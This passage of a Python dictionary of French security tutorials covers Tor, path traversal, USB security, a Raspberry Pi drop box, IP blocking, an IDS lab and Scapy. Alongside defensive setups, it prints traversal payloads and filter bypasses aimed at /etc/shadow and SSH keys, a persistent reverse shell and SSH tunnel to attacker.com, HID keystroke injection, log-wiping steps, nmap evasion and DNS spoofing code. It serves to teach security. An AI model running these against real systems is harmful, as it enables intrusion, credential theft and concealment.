    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept-Language': 'en-US,en;q=0.5',
}
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Mélanger identités

```python
# MAUVAIS : réutiliser la même session
session.get('https://site-anonyme.com')
session.get('https://mon-vrai-site.com')  # Corrélation possible!

# BON : nouvelle identité entre les contextes
tor.renew_identity()
```
""",
        "tools": """
## Outils

- **Tor Browser** : Navigateur configuré
- **stem** : Librairie Python pour contrôler TOR
- **torsocks** : Wrapper pour applications
""",
        "references": """
## Références

- [Tor Project](https://www.torproject.org/)
- [Stem Documentation](https://stem.torproject.org/)
""",
    },

    "Python.Traversal.Vulnerabilities": {
        "title": """Path Traversal - Vulnérabilités et Exploitation""",
        "intro": """
## Introduction

Le **Path Traversal** (ou Directory Traversal) est une vulnérabilité web permettant à un attaquant d'accéder à des fichiers en dehors du répertoire prévu par l'application.

### Impact potentiel

- Lecture de fichiers sensibles (`/etc/passwd`, `.env`, `config.php`)
- Accès aux logs et données utilisateurs
- Parfois exécution de code via inclusion de fichiers
""",
        "theory": """
## Théorie et Concepts

### Comment fonctionne le Path Traversal ?

```
Requête normale:
GET /download?file=rapport.pdf
→ /var/www/uploads/rapport.pdf

Requête malveillante:
GET /download?file=../../../etc/passwd
→ /var/www/uploads/../../../etc/passwd
→ /etc/passwd
```

### Séquences d'échappement courantes

| Séquence | Encodage URL | Description |
|----------|--------------|-------------|
| `../` | `%2e%2e%2f` | Remonte d'un niveau |
| `..\` | `%2e%2e%5c` | Windows |
| `....//` | - | Double encoding bypass |
| `..%252f` | - | Double URL encode |
| `%c0%ae%c0%ae/` | - | UTF-8 overlong |

### Fichiers cibles courants

**Linux:**
```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
~/.ssh/id_rsa
```

**Windows:**
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Détection de vulnérabilités

```python
import requests

def test_path_traversal(url, param):
    payloads = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc/passwd',
        '..%252f..%252f..%252fetc/passwd',
        '/etc/passwd',
        '....\\....\\....\\windows\\win.ini',
    ]

    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        r = requests.get(test_url)

        # Indicateurs de succès
        if 'root:' in r.text or '[fonts]' in r.text:
            print(f"[VULN] {payload}")
            return True

    return False

# test_path_traversal('http://target/download', 'file')
```

### 2. Protection en Python

```python
import os
from pathlib import Path

UPLOAD_DIR = Path('/var/www/uploads').resolve()

def secure_file_access(filename):
    # Nettoyer le nom de fichier
    safe_name = os.path.basename(filename)

    # Construire le chemin
    file_path = (UPLOAD_DIR / safe_name).resolve()

    # Vérifier que le chemin est dans le répertoire autorisé
    if not str(file_path).startswith(str(UPLOAD_DIR)):
        raise SecurityError("Tentative de path traversal détectée")

    if not file_path.exists():
        raise FileNotFoundError()

    return file_path

# Flask exemple
@app.route('/download')
def download():
    filename = request.args.get('file', '')
    try:
        path = secure_file_access(filename)
        return send_file(path)
    except SecurityError:
        abort(403)
```

### 3. Bypass de filtres

```python
# Si le serveur filtre '../'
def generate_bypass_payloads(target_file):
    return [
        f'....//....//..../{target_file}',  # Double
        f'..././..././{target_file}',        # Nested
        f'..%2f..%2f{target_file}',          # URL encode
        f'..%252f..%252f{target_file}',      # Double encode
        f'..\..\{target_file}',            # Backslash
        f'/....//..../{target_file}',        # Absolute + bypass
    ]
```
""",
        "best_practices": """
## Bonnes Pratiques

### Validation stricte

```python
import re
import os

def validate_filename(filename):
    # 1. Whitelist de caractères
    if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
        return False

    # 2. Pas de séquences dangereuses
    dangerous = ['..', '/', '\\', '%', '\x00']
    for seq in dangerous:
        if seq in filename:
            return False

    # 3. Extension autorisée
    allowed_ext = {'.pdf', '.png', '.jpg', '.txt'}
    ext = os.path.splitext(filename)[1].lower()
    if ext not in allowed_ext:
        return False

    return True
```

### Architecture sécurisée

```
/var/www/
├── app/           # Code application (non accessible)
├── uploads/       # Fichiers utilisateurs
│   └── .htaccess  # Deny from all
└── public/        # Seul répertoire accessible
    └── index.php
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Filtrage insuffisant

```python
# MAUVAIS - Remplace une seule fois
filename = filename.replace('../', '')
# Bypass: '....//etc/passwd' → '../etc/passwd'

# BON - Boucle jusqu'à suppression complète
while '../' in filename or '..\\'in filename:
    filename = filename.replace('../', '').replace('..\\', '')
```

### ❌ Vérification après manipulation

```python
# MAUVAIS - Check avant normalisation
if '..' not in filename:
    path = os.path.join(base, filename)  # VULN!

# BON - Check après résolution
path = os.path.realpath(os.path.join(base, filename))
if not path.startswith(os.path.realpath(base)):
    raise SecurityError()
```
""",
        "tools": """
## Outils de Test

### Automatisation avec ffuf

```bash
# Wordlist de path traversal
ffuf -u "http://target/read?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -mc 200 -fs 0
```

### Burp Suite Intruder

1. Capturer la requête avec le paramètre fichier
2. Envoyer à Intruder
3. Charger une wordlist LFI/Path Traversal
4. Analyser les réponses de taille différente
""",
        "references": """
## Références

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

### Classification
- **CWE-22** : Improper Limitation of a Pathname to a Restricted Directory
- **OWASP Top 10** : A01:2021 - Broken Access Control
""",
    },

    "Python.Usb.Test": {
        "title": """Tests de Sécurité USB""",
        "intro": """
## Introduction

Les **périphériques USB** représentent un vecteur d'attaque important : keyloggers, BadUSB, exfiltration de données, etc.

### Risques USB

- HID Injection (clavier malveillant)
- Malware via autorun
- Exfiltration de données
- Attaques physiques (USB Killer)
""",
        "theory": """
## Théorie et Concepts

### Classes USB

| Classe | Description | Risque |
|--------|-------------|--------|
| HID | Clavier/Souris | Injection de frappes |
| Mass Storage | Clé USB | Malware, exfiltration |
| CDC | Communication | Backdoor réseau |
| DFU | Firmware update | Modification firmware |

### BadUSB

```
Clé USB normale:
[USB Controller] → [Flash Storage]

BadUSB:
[USB Controller] → [Microcontrôleur]
                         │
                         ├──► Émule clavier
                         ├──► Exécute payload
                         └──► Parfois: stockage aussi
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Détecter les périphériques USB

```python
import usb.core
import usb.util

def list_usb_devices():
    devices = []

    for dev in usb.core.find(find_all=True):
        try:
            manufacturer = usb.util.get_string(dev, dev.iManufacturer)
            product = usb.util.get_string(dev, dev.iProduct)
        except:
            manufacturer = 'Unknown'
            product = 'Unknown'

        devices.append({
            'vendor_id': hex(dev.idVendor),
            'product_id': hex(dev.idProduct),
            'manufacturer': manufacturer,
            'product': product,
            'class': dev.bDeviceClass
        })

    return devices

for dev in list_usb_devices():
    print(f"{dev['vendor_id']}:{dev['product_id']} - {dev['product']}")
```

### 2. Monitoring des événements USB

```python
import pyudev
import time

def monitor_usb():
    context = pyudev.Context()
    monitor = pyudev.Monitor.from_netlink(context)
    monitor.filter_by(subsystem='usb')

    print("Monitoring USB events...")

    for device in iter(monitor.poll, None):
        if device.action == 'add':
            print(f"[CONNECTED] {device.get('ID_VENDOR')} - {device.get('ID_MODEL')}")

            # Vérifier si c'est un HID
            if 'ID_USB_INTERFACES' in device.properties:
                if ':03' in device.get('ID_USB_INTERFACES'):
                    print("[WARNING] HID device detected!")

        elif device.action == 'remove':
            print(f"[DISCONNECTED] {device.sys_name}")

monitor_usb()
```

### 3. Politique de whitelist

```python
ALLOWED_DEVICES = {
    ('0x046d', '0xc52b'),  # Logitech Receiver
    ('0x8087', '0x0024'),  # Intel Hub
}

def check_device_allowed(vendor_id, product_id):
    return (vendor_id, product_id) in ALLOWED_DEVICES

def enforce_usb_policy():
    context = pyudev.Context()
    monitor = pyudev.Monitor.from_netlink(context)
    monitor.filter_by(subsystem='usb')

    for device in iter(monitor.poll, None):
        if device.action == 'add':
            vid = device.get('ID_VENDOR_ID')
            pid = device.get('ID_MODEL_ID')

            if not check_device_allowed(vid, pid):
                print(f"[BLOCKED] Unauthorized device: {vid}:{pid}")
                # Désactiver le périphérique
                # (nécessite des droits admin et udev rules)
```

### 4. Détection d'exfiltration

```python
import os
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class USBExfiltrationDetector(FileSystemEventHandler):
    def __init__(self, threshold_mb=100):
        self.threshold = threshold_mb * 1024 * 1024
        self.copy_size = 0
        self.start_time = time.time()

    def on_created(self, event):
        if not event.is_directory:
            try:
                size = os.path.getsize(event.src_path)
                self.copy_size += size

                elapsed = time.time() - self.start_time
                if elapsed < 60 and self.copy_size > self.threshold:
                    print(f"[ALERT] Mass copy detected: {self.copy_size/1024/1024:.1f}MB")

            except:
                pass

# Surveiller les montages USB
def monitor_usb_mounts():
    observer = Observer()
    handler = USBExfiltrationDetector()

    # Surveiller /media ou /mnt
    observer.schedule(handler, '/media', recursive=True)
    observer.start()
```
""",
        "best_practices": """
## Bonnes Pratiques

### Politique USB stricte

```bash
# Bloquer tous les USB storage
# /etc/modprobe.d/usb-storage.conf
blacklist usb-storage

# Ou via udev rules
# /etc/udev/rules.d/99-usb-block.rules
ACTION=="add", SUBSYSTEMS=="usb", ATTR{authorized}="0"
```

### Chiffrement obligatoire

```python
# Vérifier si le périphérique est chiffré
# avant d'autoriser l'accès
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Faire confiance aux VID/PID

```python
# Les VID/PID peuvent être falsifiés!
# Un Arduino peut se faire passer pour un clavier Logitech
# Utiliser des certificats ou du hardware attestation
```
""",
        "tools": """
## Outils

- **USBGuard** : Politique USB Linux
- **usbutils** : lsusb et outils
- **Rubber Ducky** : Test HID injection
""",
        "references": """
## Références

- [USBGuard](https://usbguard.github.io/)
- [BadUSB](https://srlabs.de/badusb/)
""",
    },

    "Raspberry.Hack": {
        "title": """Raspberry Pi - Plateforme de Hacking""",
        "intro": """
## Introduction

Le **Raspberry Pi** est une plateforme idéale pour le pentesting et la sécurité offensive grâce à sa taille réduite, son faible coût et sa compatibilité Linux.

### Pourquoi le Raspberry Pi ?

- **Discret** : Petit, silencieux, facile à dissimuler
- **Low-cost** : Accessible pour les budgets limités
- **Polyvalent** : Linux complet, GPIO, USB gadget mode
- **Communauté** : Documentation et outils abondants
""",
        "theory": """
## Théorie et Concepts

### Distributions recommandées

| Distribution | Usage | Spécificités |
|--------------|-------|--------------|
| Kali Linux ARM | Pentest complet | Tous les outils Kali |
| P4wnP1 A.L.O.A. | Attaques USB | HID, network, mass storage |
| Raspberry Pi OS | Base personnalisée | Léger, personnalisable |

### Cas d'usage en pentest

```
┌─────────────────────────────────────────────────┐
│                 DROP BOX                         │
│  Pi laissé sur le réseau cible                  │
│  - Reverse shell persistant                      │
│  - Scan du réseau interne                        │
│  - Pivot point pour attaquant distant           │
└─────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────┐
│                 EVIL USB                         │
│  Pi Zero en USB gadget mode                     │
│  - Émule clavier (HID injection)                │
│  - Émule carte réseau (network tap)             │
│  - Exfiltre données (mass storage)              │
└─────────────────────────────────────────────────┘
```

### USB Gadget Mode (Pi Zero)

Le Pi Zero peut émuler différents périphériques USB :

- **HID** : Clavier/souris pour injection de commandes
- **ECM/RNDIS** : Interface réseau pour MITM
- **Mass Storage** : Clé USB pour exfiltration
- **Serial** : Port série pour debug
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Configuration P4wnP1

```bash
# Installation
git clone https://github.com/RoganDawes/P4wnP1_aloa
cd P4wnP1_aloa
./install.sh

# Configuration HID attack
cat > /usr/local/P4wnP1/HIDScripts/payload.js << 'EOF'
// Ouvre un terminal et exécute une commande
layout('fr');
delay(1000);
press('GUI r');
delay(500);
type('cmd');
delay(500);
press('RETURN');
delay(1000);
type('whoami > C:\\temp\\pwned.txt');
press('RETURN');
EOF
```

### 2. Drop Box avec reverse shell

```bash
#!/bin/bash
# Script au démarrage pour connexion persistante

ATTACKER_IP="attacker.com"
ATTACKER_PORT="4444"

while true; do
    # Tente de se connecter
    bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1

    # Attendre avant de réessayer
    sleep 60
done
```

### 3. Configuration réseau discrète

```bash
# Connexion WiFi automatique
cat >> /etc/wpa_supplicant/wpa_supplicant.conf << EOF
network={
    ssid="TargetWiFi"
    psk="password"
    priority=1
}
EOF

# Reverse SSH tunnel persistant
autossh -M 0 -o "ServerAliveInterval 30" \
    -R 2222:localhost:22 user@attacker.com
```

### 4. Alimentation discrète

```bash
# Options d'alimentation
# - Power over Ethernet (PoE hat)
# - Batterie USB (powerbank)
# - Prise murale USB (chargeur)
# - Solaire (usage extérieur)

# Réduire consommation
echo 1 > /sys/class/leds/led0/brightness  # Éteindre LED
tvservice -o  # Désactiver HDMI
```
""",
        "best_practices": """
## Bonnes Pratiques

### Sécurisation du Pi

```bash
# Chiffrement du disque (LUKS)
cryptsetup luksFormat /dev/mmcblk0p2
cryptsetup open /dev/mmcblk0p2 cryptroot

# Auto-destruction si capture
# Script déclenché par:
# - Mot de passe incorrect x3
# - Absence de beacon WiFi
# - Bouton physique
```

### Effacement des traces

```bash
#!/bin/bash
# Nettoyage avant extraction

# Logs
shred -u /var/log/*
history -c

# Fichiers temporaires
rm -rf /tmp/*

# Metadata réseau
ip link set wlan0 down
macchanger -r wlan0
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Laisser les identifiants par défaut

```bash
# TOUJOURS changer
passwd pi
sudo passwd root
```

### ❌ Connexion directe sans tunnel

```bash
# MAUVAIS : Connexion SSH directe
ssh pi@target-network-pi

# BON : Tunnel via serveur externe
ssh -J relay@relay-server pi@internal-pi
```
""",
        "tools": """
## Outils Recommandés

### Matériel

- **Antenne WiFi externe** : Alfa AWUS036ACH
- **Batterie** : Anker PowerCore 10000
- **Boîtier discret** : Impression 3D custom
- **GPS** : Module USB pour wardriving

### Logiciels

```bash
# Installation des outils essentiels
apt install nmap masscan aircrack-ng \
    responder impacket-scripts \
    proxychains tor
```
""",
        "references": """
## Références

- [P4wnP1 Documentation](https://github.com/RoganDawes/P4wnP1_aloa)
- [Kali ARM](https://www.kali.org/docs/arm/)
- [Raspberry Pi Security](https://www.raspberrypi.org/documentation/configuration/security.md)
""",
    },

    "Raspberry.IpBlocker": {
        "title": """Blocage Automatique d'IP Malveillantes""",
        "intro": """
## Introduction

Système de défense automatisé utilisant **iptables**, **fail2ban** et des threat feeds pour bloquer les IP malveillantes en temps réel.

### Composants

- **iptables/nftables** : Firewall Linux
- **fail2ban** : Détection d'intrusion sur logs
- **ipset** : Gestion efficace de listes d'IP
- **Threat feeds** : Listes d'IP malveillantes
""",
        "theory": """
## Théorie et Concepts

### Architecture de défense

```
┌─────────────────────────────────────────────────────┐
│                    INTERNET                          │
└─────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│                   IPTABLES                           │
│  ┌─────────┐   ┌─────────┐   ┌─────────┐           │
│  │ ipset   │   │ fail2ban│   │ custom  │           │
│  │ threat  │   │ jails   │   │ rules   │           │
│  └─────────┘   └─────────┘   └─────────┘           │
└─────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│                   SERVICES                           │
│         SSH    │    HTTP    │    Custom              │
└─────────────────────────────────────────────────────┘
```

### iptables vs ipset

| Approche | Performance | Usage |
|----------|-------------|-------|
| iptables règles multiples | O(n) | < 100 IPs |
| ipset hash | O(1) | > 1000 IPs |

```bash
# LENT : 10000 règles iptables
iptables -A INPUT -s 1.2.3.4 -j DROP
iptables -A INPUT -s 1.2.3.5 -j DROP
# ... x10000

# RAPIDE : 1 règle + ipset
ipset create blacklist hash:ip
ipset add blacklist 1.2.3.4
# ... x10000
iptables -A INPUT -m set --match-set blacklist src -j DROP
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Configuration ipset

```bash
# Créer un set pour les IP malveillantes
ipset create blacklist hash:ip hashsize 4096 maxelem 100000

# Ajouter des IPs
ipset add blacklist 192.168.1.100
ipset add blacklist 10.0.0.0/8  # Supporte les CIDR

# Lister le contenu
ipset list blacklist

# Sauvegarder
ipset save > /etc/ipset.conf

# Restaurer au boot
ipset restore < /etc/ipset.conf
```

### 2. Intégration iptables

```bash
# Créer la règle de blocage
iptables -I INPUT -m set --match-set blacklist src -j DROP
iptables -I FORWARD -m set --match-set blacklist src -j DROP

# Ajouter le logging avant DROP
iptables -I INPUT -m set --match-set blacklist src -j LOG \
    --log-prefix "BLOCKED: " --log-level 4

# Persister les règles
iptables-save > /etc/iptables/rules.v4
```

### 3. Configuration fail2ban

```ini
# /etc/fail2ban/jail.local

[DEFAULT]
bantime = 1h
findtime = 10m
maxretry = 3
banaction = iptables-ipset-proto6

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3

[nginx-http-auth]
enabled = true
filter = nginx-http-auth
logpath = /var/log/nginx/error.log
maxretry = 5

[custom-api]
enabled = true
port = 8080
filter = custom-api
logpath = /var/log/api/access.log
maxretry = 10
findtime = 1m
bantime = 30m
```

### 4. Script de mise à jour automatique

```python
#!/usr/bin/env python3
import requests
import subprocess

THREAT_FEEDS = [
    'https://www.abuseipdb.com/blacklist/ip',
    'https://rules.emergingthreats.net/fwrules/emerging-Block-IPs.txt',
]

def update_blacklist():
    ips = set()

    for feed in THREAT_FEEDS:
        try:
            r = requests.get(feed, timeout=30)
            for line in r.text.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    ips.add(line.split()[0])
        except Exception as e:
            print(f"Erreur feed {feed}: {e}")

    print(f"IPs collectées: {len(ips)}")

    # Recréer le set
    subprocess.run(['ipset', 'flush', 'threat-feed'])

    for ip in ips:
        subprocess.run(['ipset', 'add', 'threat-feed', ip, '-exist'])

    print("Blacklist mise à jour")

if __name__ == '__main__':
    update_blacklist()
```

### 5. Cron pour mise à jour

```bash
# /etc/cron.d/threat-feeds
0 */6 * * * root /opt/scripts/update_blacklist.py >> /var/log/threat-feed.log 2>&1
```
""",
        "best_practices": """
## Bonnes Pratiques

### Rate limiting

```bash
# Limiter les nouvelles connexions SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
    -m recent --set --name SSH

iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
    -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP
```

### Whitelist avant blacklist

```bash
# Ordre des règles
iptables -A INPUT -m set --match-set whitelist src -j ACCEPT
iptables -A INPUT -m set --match-set blacklist src -j DROP
iptables -A INPUT -j ACCEPT
```

### Alerting

```python
import smtplib
from email.mime.text import MIMEText

def alert_on_block(ip, reason):
    msg = MIMEText(f"IP {ip} bloquée: {reason}")
    msg['Subject'] = f'[SECURITY] IP Blocked: {ip}'
    msg['From'] = 'security@example.com'
    msg['To'] = 'admin@example.com'

    with smtplib.SMTP('localhost') as s:
        s.send_message(msg)
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Se bloquer soi-même

```bash
# TOUJOURS whitelister son IP avant
ipset add whitelist VOTRE_IP

# Ou règle iptables prioritaire
iptables -I INPUT -s VOTRE_IP -j ACCEPT
```

### ❌ Règles non persistantes

```bash
# Les règles iptables sont perdues au reboot!
# Installer iptables-persistent
apt install iptables-persistent

# Sauvegarder manuellement
netfilter-persistent save
```
""",
        "tools": """
## Outils

### fail2ban-client

```bash
# Status
fail2ban-client status
fail2ban-client status sshd

# Débannir une IP
fail2ban-client set sshd unbanip 192.168.1.100

# Bannir manuellement
fail2ban-client set sshd banip 192.168.1.100
```

### Sources de threat intel

- [AbuseIPDB](https://www.abuseipdb.com/)
- [Emerging Threats](https://rules.emergingthreats.net/)
- [Shodan](https://www.shodan.io/)
- [GreyNoise](https://www.greynoise.io/)
""",
        "references": """
## Références

- [fail2ban Documentation](https://www.fail2ban.org/wiki/index.php/Main_Page)
- [ipset Manual](https://ipset.netfilter.org/ipset.man.html)
- [iptables Tutorial](https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html)
""",
    },

    "Rust.Nmap.Network": {
        "title": """Laboratoire IDS - Snort, Suricata et Zeek""",
        "intro": """
## Introduction

Laboratoire complet pour tester et comparer les trois principaux **IDS (Intrusion Detection Systems)** open source : Snort, Suricata et Zeek.

### Objectifs

- Comprendre les différences entre les IDS
- Tester l'évasion de détection
- Apprendre à écrire des règles custom
- Comparer les performances
""",
        "theory": """
## Théorie et Concepts

### Comparaison des IDS

| Caractéristique | Snort | Suricata | Zeek |
|-----------------|-------|----------|------|
| Type | Signature | Signature | Comportemental |
| Multi-threading | Non (v2) | Oui | Oui |
| Protocoles | Deep inspection | Deep inspection | Parsing natif |
| Logs | Unified2, syslog | EVE JSON | Logs structurés |
| Règles | Snort rules | Snort compatible | Scripts Zeek |

### Architecture du lab

```
┌─────────────────────────────────────────────────────┐
│                   COMMANDER (Rust)                   │
│              Dashboard + Contrôle                    │
│                   Port 3000                          │
└─────────────────────────────────────────────────────┘
         │              │              │
         ▼              ▼              ▼
┌─────────────┐  ┌─────────────┐  ┌─────────────┐
│   SNORT     │  │  SURICATA   │  │    ZEEK     │
│  Container  │  │  Container  │  │  Container  │
│             │  │  + EveBox   │  │             │
└─────────────┘  └─────────────┘  └─────────────┘
         │              │              │
         └──────────────┼──────────────┘
                        │
                        ▼
              ┌─────────────────┐
              │  TARGET (nginx) │
              │   Container     │
              └─────────────────┘
```

### Niveaux de sécurité

| Niveau | Nom | Description |
|--------|-----|-------------|
| 1 | Minimal | Détecte seulement les attaques évidentes |
| 2 | Basic | Ajoute détection de scans basiques |
| 3 | Moderate | Détection timing et patterns |
| 4 | Strict | Détection fragmentation |
| 5 | Paranoid | Tout trafic anormal alerté |
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Démarrage du laboratoire

```bash
# Cloner et démarrer
git clone https://github.com/venantvr-security/Rust.Nmap.Network
cd Rust.Nmap.Network

# Démarrer tous les labs
./start_all_labs.sh

# Ou individuellement
cd snort-lab && docker compose up -d
cd suricata-lab && docker compose up -d
cd zeek-lab && docker compose up -d
```

### 2. Test de détection basique

```bash
# Scan détecté par tous les IDS
nmap -sS -p 80,443 target

# Vérifier les alertes
docker logs snort-lab_snort_1 | grep ALERT
```

### 3. Techniques d'évasion Nmap

```bash
# Fragmentation IP (-f)
nmap -f target
nmap -f -f target  # Fragments plus petits
nmap --mtu 24 target

# Timing lent (-T0 paranoid)
nmap -T0 -p 80 target

# Decoys (leurres)
nmap -D RND:10 target
nmap -D decoy1,decoy2,ME target

# Source port (DNS)
nmap --source-port 53 target

# Combinaison
nmap -f -T2 -D RND:5 --source-port 53 target
```

### 4. Écriture de règles Snort/Suricata

```
# Règle basique
alert tcp any any -> $HOME_NET 80 (msg:"Web scan";
    content:"GET"; http_method;
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:1000001; rev:1;)

# Détection de fragmentation
alert ip any any -> $HOME_NET any (msg:"IP Fragmentation";
    fragbits:M;
    sid:1000002; rev:1;)

# Détection scan NULL
alert tcp any any -> $HOME_NET any (msg:"NULL Scan";
    flags:0;
    sid:1000003; rev:1;)
```

### 5. Script Zeek custom

```zeek
# detect_scans.zeek
@load base/frameworks/notice

module ScanDetection;

export {
    redef enum Notice::Type += {
        Port_Scan_Detected
    };

    const scan_threshold = 15 &redef;
    const scan_interval = 1min &redef;
}

global scan_attempts: table[addr] of count &default=0;

event connection_attempt(c: connection)
{
    local scanner = c$id$orig_h;
    ++scan_attempts[scanner];

    if (scan_attempts[scanner] > scan_threshold)
    {
        NOTICE([
            $note=Port_Scan_Detected,
            $msg=fmt("Port scan from %s", scanner),
            $src=scanner
        ]);
    }
}
```
""",
        "best_practices": """
## Bonnes Pratiques

### Tuning des règles

```bash
# Désactiver les règles bruyantes
# /etc/suricata/disable.conf
1:2100498
1:2100499

# Modifier les seuils
# /etc/suricata/threshold.config
suppress gen_id 1, sig_id 2100498
threshold gen_id 1, sig_id 2100366, type limit, track by_src, count 1, seconds 60
```

### Monitoring des performances

```bash
# Stats Suricata
suricatasc -c "iface-stat eth0"

# Drops de paquets
cat /var/log/suricata/stats.log | grep drop
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Règles trop permissives

```
# MAUVAIS : génère trop d'alertes
alert tcp any any -> any any (msg:"Traffic"; sid:1;)

# BON : ciblé et filtré
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (
    msg:"Web attack";
    content:"/admin"; http_uri;
    threshold:type limit, track by_src, count 1, seconds 60;
    sid:1;)
```

### ❌ Ignorer les performances

```bash
# Vérifier la charge CPU
top -p $(pgrep suricata)

# Si drops > 1%, augmenter les workers
# /etc/suricata/suricata.yaml
threading:
  set-cpu-affinity: yes
  cpu-affinity:
    - management-cpu-set:
        cpu: [ 0 ]
    - worker-cpu-set:
        cpu: [ 1, 2, 3 ]
```
""",
        "tools": """
## Outils du Lab

### Interfaces web

- **Commander** : http://localhost:3000
- **EveBox** (Suricata) : http://localhost:5636
- **Filebrowser** : http://localhost:8080

### Scripts utiles

```bash
# Test rapide
./quick_test.sh snort

# Scan tous les niveaux
./scan_all_levels.sh

# Générer rapport
./generate_report.sh
```
""",
        "references": """
## Références

- [Snort Rules](https://www.snort.org/rules_explanation)
- [Suricata Documentation](https://suricata.readthedocs.io/)
- [Zeek Documentation](https://docs.zeek.org/)
""",
    },

    "Scapy.Strategies": {
        "title": """Scapy - Manipulation de Paquets Réseau""",
        "intro": """
## Introduction

**Scapy** est une bibliothèque Python puissante pour la manipulation, l'envoi, la capture et l'analyse de paquets réseau.

### Capacités

- Création de paquets personnalisés
- Scan de ports et de réseaux
- Attaques réseau (ARP spoofing, etc.)
- Analyse de trafic
- Fuzzing de protocoles
""",
        "theory": """
## Théorie et Concepts

### Modèle en couches

```python
# Scapy permet de manipuler chaque couche
Ether() / IP() / TCP() / Raw()
#  L2      L3     L4      L7

# Exemple concret
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      IP(dst="192.168.1.1") / \
      TCP(dport=80, flags="S")
```

### Opérations de base

| Opération | Fonction | Description |
|-----------|----------|-------------|
| Création | `IP()`, `TCP()` | Créer des paquets |
| Envoi | `send()`, `sendp()` | Envoyer L3 ou L2 |
| Réception | `sr()`, `sr1()` | Send & Receive |
| Capture | `sniff()` | Capturer le trafic |
| Lecture | `rdpcap()` | Lire un fichier pcap |
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Création et envoi de paquets

```python
from scapy.all import *

# Ping ICMP
pkt = IP(dst="192.168.1.1") / ICMP()
reply = sr1(pkt, timeout=2)
if reply:
    print(f"Réponse de {reply.src}")

# TCP SYN
syn = IP(dst="192.168.1.1") / TCP(dport=80, flags="S")
syn_ack = sr1(syn, timeout=2)
if syn_ack and syn_ack.haslayer(TCP):
    if syn_ack[TCP].flags == "SA":
        print("Port 80 ouvert")
```

### 2. Scanner de ports

```python
def port_scan(target, ports):
    open_ports = []

    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=0)

        if resp and resp.haslayer(TCP):
            if resp[TCP].flags == 0x12:  # SYN-ACK
                open_ports.append(port)
                # Envoyer RST pour fermer proprement
                rst = IP(dst=target) / TCP(dport=port, flags="R")
                send(rst, verbose=0)

    return open_ports

# Utilisation
ports = port_scan("192.168.1.1", range(1, 1024))
print(f"Ports ouverts: {ports}")
```

### 3. ARP Scan

```python
def arp_scan(network):
    # Broadcast ARP
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)

    answered, _ = srp(arp_request, timeout=2, verbose=0)

    hosts = []
    for sent, received in answered:
        hosts.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })

    return hosts

# Scanner le réseau local
hosts = arp_scan("192.168.1.0/24")
for h in hosts:
    print(f"{h['ip']:15} {h['mac']}")
```

### 4. Sniffing avec filtres

```python
def packet_callback(pkt):
    if pkt.haslayer(TCP):
        src = f"{pkt[IP].src}:{pkt[TCP].sport}"
        dst = f"{pkt[IP].dst}:{pkt[TCP].dport}"
        flags = pkt[TCP].flags
        print(f"{src} -> {dst} [{flags}]")

# Capturer le trafic HTTP
sniff(filter="tcp port 80", prn=packet_callback, count=100)

# Capturer et sauvegarder
packets = sniff(filter="tcp", count=1000)
wrpcap("capture.pcap", packets)
```

### 5. DNS Spoofing

```python
def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):  # DNS Query
        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                  UDP(dport=pkt[UDP].sport, sport=53) / \
                  DNS(id=pkt[DNS].id, qr=1, aa=1,
                      qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname,
                               rdata="ATTACKER_IP"))

        send(spoofed, verbose=0)
        print(f"Spoofed: {pkt[DNSQR].qname.decode()}")

# Attention: uniquement sur réseau de test!
sniff(filter="udp port 53", prn=dns_spoof)
```

### 6. Traceroute personnalisé

```python
def traceroute_custom(target, max_ttl=30):
    for ttl in range(1, max_ttl + 1):
        pkt = IP(dst=target, ttl=ttl) / ICMP()
        reply = sr1(pkt, timeout=1, verbose=0)

        if reply is None:
            print(f"{ttl}. *")
        elif reply.haslayer(ICMP):
            print(f"{ttl}. {reply.src}")

            if reply[ICMP].type == 0:  # Echo Reply
                print(f"Destination atteinte!")
                break

